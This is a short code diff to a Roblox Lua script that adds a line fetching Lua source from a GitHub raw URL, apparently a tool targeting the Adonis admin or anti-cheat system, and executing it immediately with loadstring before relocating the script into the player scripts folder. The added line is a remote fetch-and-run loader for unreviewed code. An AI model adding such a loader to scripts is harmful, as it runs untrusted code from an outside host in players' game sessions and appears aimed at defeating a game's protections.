@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
+
+task.wait(5)
+
 script.Parent = game.StarterPlayer.StarterPlayerScripts
 
 task.wait(1)
